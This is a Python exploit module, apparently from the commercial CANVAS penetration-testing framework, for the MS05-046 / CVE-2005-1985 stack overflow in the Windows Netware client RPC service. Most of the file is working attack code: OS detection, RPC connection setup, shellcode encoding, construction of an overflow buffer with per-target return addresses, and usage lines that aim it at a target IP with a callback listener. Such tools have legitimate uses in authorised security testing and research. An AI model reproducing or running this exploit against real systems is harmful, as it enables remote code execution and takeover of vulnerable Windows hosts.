#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import struct

from exploitutils import *
from encoder import widechar
from msrpcexploit import msrpcexploit 
from MOSDEF import mosdef
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

NAME='Microsoft Netware Service RPC Overflow'
DESCRIPTION='Microsoft Netware Service RPC Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10-11-2005'
DOCUMENTATION["CVE Name"] = "CVE-2005-1985"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1985"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Note']=''
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS05-046.mspx'
VERSION='0.2'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP']
PROPERTY['MSADV']='MS05-046'
CHANGELOG="""
KK 08/13/07:
- Rewritten
"""

NOTES="""
Tested on:
Windows 2000 Server SP4 Japanese OOTB

Usage:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./exploits/ms05_046/ms05_046.py -v 0 -t 10.10.13.20 -l 10.10.13.1 -d 5555
"""

targets={
    0: ['Autoversioning',0,0],
    1: ['Windows 2000 SP0-SP4',1108,0x001ecad4],
    2: ['Windows XP SP0-SP1A',1104,0x0021cad4],
    3: ['Windows NT 4.0',1112,0x002acad4],
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.version        = 0
        self.badstring      = '\0\xff'
        self.UUID           = u'e67ab081-9844-3521-9d32-834f038001c0'
        self.uuidversion    = u'1.0'
        self.targetfunction = 43
        self.autoversion    = 1
        self.subesp         = 3000
        self.listenerArgsDict['fromcreatethread']=1
        return
   
    def encodeshellcode(self, rawshellcode):
        self.log('Using widechar encoder')
        app=widechar.widechar_chunkedaddencoder()
        app.setbadstring(widechar.wcsupr_bad)
        data=app.encode(rawshellcode)
        if data=='':
            self.log('Fatal error - could not encode shellcode!')
            raise Exception,'Could not encode shellcode'
        self.shellcode=data
        self.log('Final shellcode is %d long'%len(self.shellcode))
        return self.shellcode

    def testOS(self):        
        app = self.engine.getModuleExploit('osdetect')
        app.link(self)
        print 'target=%s->%s'%(self.target,app.target)
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000') > -1:
            self.version=1
            return 1
        elif app.result.find('XP') > -1:
            self.version=2
            return 1
        elif app.result.find('NT') > -1:
            self.version=3
            return 1
        else:
            self.log('OS not vulnerable: %s' % result)
        return 0
    
    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_np:%s[\\browser]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host, self.port),\
                        'ncacn_ip_tcp:%s[1026]'%(host),\
                        'ncacn_ip_tcp:%s[1027]'%(host),\
                        'ncacn_ip_tcp:%s[1028]'%(host)]
        connectionList+=self.searchifids()
        connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList
    
    def buildDcePacket(self):
        self.info,self.offset,self.eip=targets[self.version]
        self.log('Generating attack string for version: %s'%(self.info))
        if len(self.shellcode)>self.offset:
            self.log('Shellcode of len %d is too big for size %d'%(len(self.shellcode),self.offset))
            raise Exception,'Shellcode too big!'
        packet=''
        data=''
        data+=self.shellcode
        data+='A'*(self.offset-len(data))
        data+=struct.pack('<L',self.eip)
        data+='B'*0xc
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86')
        if (len(data)%2)==1:
            data+='C'        
        packet+=intel_order(0)
        packet+=intel_order(1)
        packet+=s_dce_raw_unistring(data)
        packet+=intel_order(0)
        packet+=s_dce_win2k_unistring('')
        packet+=intel_order(0)
        packet+=intel_order(1)
        packet+=intel_order(2)
        packet+=intel_order(0)
        return packet
    
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
